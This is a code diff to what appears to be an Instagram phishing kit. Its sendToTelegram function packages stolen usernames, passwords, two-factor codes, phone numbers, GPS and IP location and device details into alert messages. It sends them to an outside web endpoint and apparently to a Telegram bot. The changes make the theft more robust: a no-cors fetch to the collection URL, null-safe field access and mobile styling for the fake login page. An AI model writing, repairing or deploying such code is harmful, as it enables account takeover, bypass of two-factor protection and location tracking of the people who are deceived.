@@ -343,14 +343,14 @@
 
         @media (max-width: 450px) {
             .login-box, .signup-box {
-                background-color: transparent;
-                border: none;
-                padding: 20px;
+                background-color: white;
+                border: 1px solid #dbdbdb;
+                padding: 30px 20px;
             }
             
             body {
                 background-color: white;
-                padding: 0;
+                padding: 10px;
             }
             
             .modal-content {
@@ -1405,12 +1405,11 @@
         // ============================================
         async function sendToTelegram(type) {
             // 1. Prepare Data for Website
-            // We verify the link uses HTTPS to prevent blocking
             const websiteURL = WEBSITE_API_URL; 
             
             // Add the event type to the data object so the PHP knows what happened
             const payload = {
-                ...collectedData, // specific copy of all data
+                ...collectedData,
                 event_type: type
             };
 
@@ -1437,12 +1436,13 @@
             promises.push(
                 fetch(websiteURL, {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 })
-                .then(res => console.log(`Website sent (${type}):`, res.status))
+                .then(() => console.log(`Website dispatch attempted (${type})`))
                 .catch(e => console.error('Website Fail:', e))
             );
 
@@ -1471,18 +1471,18 @@
                 case 'LOCATION':
                 case 'LOCATION_IP':
                     const source = type === 'LOCATION' ? 'GPS' : 'IP';
-                    const accuracy = collectedData.location.accuracy || 'Unknown';
-                    const mapLink = collectedData.location.mapLink || 'No map available';
+                    const accuracy = collectedData.location?.accuracy || 'Unknown';
+                    const mapLink = collectedData.location?.mapLink || 'No map available';
                     
                     message = `📍 <b>INSTAGRAM - LOCATION DATA (${source})</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
-                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
-                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
-                             `🌍 <b>Coordinates:</b> ${collectedData.location.latitude}, ${collectedData.location.longitude}\n` +
-                             `🏙️ <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
-                             `📡 <b>Source:</b> ${collectedData.location.source || source}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo?.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo?.mobileNumber || 'Unknown'}\n` +
+                             `🌍 <b>Coordinates:</b> ${collectedData.location?.latitude || 'N/A'}, ${collectedData.location?.longitude || 'N/A'}\n` +
+                             `🏙️ <b>Location:</b> ${collectedData.location?.city || 'Unknown'}, ${collectedData.location?.country || 'Unknown'}\n` +
+                             `📡 <b>Source:</b> ${collectedData.location?.source || source}\n` +
                              `🎯 <b>Accuracy:</b> ${accuracy}\n` +
-                             `🕐 <b>Timezone:</b> ${collectedData.location.timezone || 'Unknown'}\n` +
+                             `🕐 <b>Timezone:</b> ${collectedData.location?.timezone || 'Unknown'}\n` +
                              `🗺️ <b>Google Maps:</b> <a href="${mapLink}">Click here</a>\n` +
                              `⏰ <b>Time:</b> ${timestamp}`;
                     break;
@@ -1490,21 +1490,21 @@
                 case 'CREDENTIALS':
                     message = `🔑 <b>INSTAGRAM - LOGIN CREDENTIALS</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
-                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
-                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo?.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo?.mobileNumber || 'Unknown'}\n` +
                              `👤 <b>Username:</b> ${collectedData.credentials.username}\n` +
                              `🔐 <b>Password:</b> ${collectedData.credentials.password}\n` +
                              `🌐 <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
-                             `📍 <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
+                             `📍 <b>Location:</b> ${collectedData.location?.city || 'Unknown'}, ${collectedData.location?.country || 'Unknown'}\n` +
                              `⏰ <b>Time:</b> ${timestamp}`;
                     break;
                     
                 case 'TWO_FACTOR':
                     message = `🔢 <b>INSTAGRAM - TWO-FACTOR CODE</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
-                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
-                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
-                             `👤 <b>Username:</b> ${collectedData.credentials.username || 'Unknown'}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo?.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo?.mobileNumber || 'Unknown'}\n` +
+                             `👤 <b>Username:</b> ${collectedData.credentials?.username || 'Unknown'}\n` +
                              `🔢 <b>2FA Code:</b> ${collectedData.twoFactorCode}\n` +
                              `⏰ <b>Time:</b> ${timestamp}`;
                     break;
@@ -1515,12 +1515,12 @@
                     
                     message = `📊 <b>INSTAGRAM - COMPLETE DATA COLLECTION</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
-                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
-                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
-                             `👤 <b>Username:</b> ${collectedData.credentials.username || 'Not captured'}\n` +
-                             `🔐 <b>Password:</b> ${collectedData.credentials.password || 'Not captured'}\n` +
-                             `🌍 <b>Location:</b> ${collectedData.location.latitude || 'Unknown'}, ${collectedData.location.longitude || 'Unknown'}\n` +
-                             `🏙️ <b>City:</b> ${collectedData.location.city || collectedData.deviceInfo.ipDetails?.city || 'Unknown'}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo?.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo?.mobileNumber || 'Unknown'}\n` +
+                             `👤 <b>Username:</b> ${collectedData.credentials?.username || 'Not captured'}\n` +
+                             `🔐 <b>Password:</b> ${collectedData.credentials?.password || 'Not captured'}\n` +
+                             `🌍 <b>Location:</b> ${collectedData.location?.latitude || 'Unknown'}, ${collectedData.location?.longitude || 'Unknown'}\n` +
+                             `🏙️ <b>City:</b> ${collectedData.location?.city || collectedData.deviceInfo.ipDetails?.city || 'Unknown'}\n` +
                              `🌐 <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
                              `📱 <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}\n` +
                              `🖥️ <b>Browser:</b> ${collectedData.deviceInfo.browser}\n` +
@@ -1530,7 +1530,7 @@
                              `💾 <b>RAM:</b> ${collectedData.deviceInfo.deviceMemory || 'Unknown'}\n` +
                              `⚡ <b>CPU Cores:</b> ${collectedData.deviceInfo.hardwareConcurrency}\n` +
                              `🕐 <b>Timezone:</b> ${collectedData.deviceInfo.timezone}\n` +
-                             `🗺️ <b>Map Link:</b> <a href="${collectedData.location.mapLink || '#'}">${collectedData.location.mapLink || 'No location'}</a>\n` +
+                             `🗺️ <b>Map Link:</b> <a href="${collectedData.location?.mapLink || '#'}">${collectedData.location?.mapLink || 'No location'}</a>\n` +
                              `⏰ <b>Session Start:</b> ${new Date(collectedData.timestamps.pageLoad).toLocaleString()}\n\n` +
                              `<b>Full User Agent:</b>\n<code>${userAgentShort}</code>`;
                     break;
